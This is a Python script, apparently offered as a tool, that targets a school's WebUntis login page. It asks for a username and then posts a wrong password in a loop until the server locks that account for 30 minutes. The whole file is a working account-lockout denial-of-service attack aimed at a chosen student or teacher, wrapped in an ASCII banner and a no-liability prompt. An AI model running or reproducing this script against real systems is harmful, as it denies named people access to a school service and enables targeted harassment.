"""importing Modules"""
import json
import re
import sys

from bs4 import BeautifulSoup
from requests_html import HTMLSession
from pathlib import Path


class WebUntis():
    """class"""
    def __init__(self) -> None:
        self.url = "https://aoide.webuntis.com/WebUntis/j_spring_security_check"
        self.logurl = "https://aoide.webuntis.com/WebUntis/"
        self.attempts = 0
        self.payload = {
            'school': 'htbla-weiz',
            'j_username': 'user',
            'j_password': 'password',
            'token': ''
        }

    def main(self):
        """sends request to server and get responce"""
        print("""
 __    __     _                 _   _                                    _     _            _     
/ / /\ \ \___| |__  /\ /\ _ __ | |_(_)___       _   _ ___  ___ _ __     | |__ | | ___   ___| | __ 
\ \/  \/ / _ \ '_ \/ / \ \ '_ \| __| / __|_____| | | / __|/ _ \ '__|____| '_ \| |/ _ \ / __| |/ / 
 \  /\  /  __/ |_) \ \_/ / | | | |_| \__ \_____| |_| \__ \  __/ | |_____| |_) | | (_) | (__|   <  
  \/  \/ \___|_.__/ \___/|_| |_|\__|_|___/      \__,_|___/\___|_|       |_.__/|_|\___/ \___|_|\_\  by Pfefan#4055

        """)

        fle = Path('tos.txt')
        fle.touch(exist_ok=True)
        with open("tos.txt", "r+", encoding="utf8") as f:
            if f.read() == "True":
                pass
            elif f.read() == "":
                i = input("I accept no liability for any property damage or personal injury caused by this program, agree y/n: ")
                if i == "y":
                    f.write("True")
                else:
                    sys.exit()

        user = input("Enter a user: ")
        school = input("Enter a school (leave empty to use htlba weiz): ")
        self.payload["j_username"] = user
        if school != "":
            self.payload["school"] = school

        while True:
            session = HTMLSession()
            s = session.post(self.url, data=self.payload)
            page = session.get(self.logurl)
            soup = BeautifulSoup(page.content, 'html.parser')

            results = soup.find('script')
            stringtext = results.get_text()
            array = stringtext.split(';')
            untis = array[3].strip()
            untis = re.sub("\s\s+"," ", untis)
            untis = untis[18:-6].split(',"lastUserName"')[0] +"}}"
            structjson = json.loads(untis)
            self.attempts += 1

            print(f"attempts: {self.attempts}", end="\r")
            if structjson["loginServiceConfig"]["loginError"] != "Invalid user name and/or password":
                print("successfully blocked the user for 30mins")
                break

WebUntis().main()
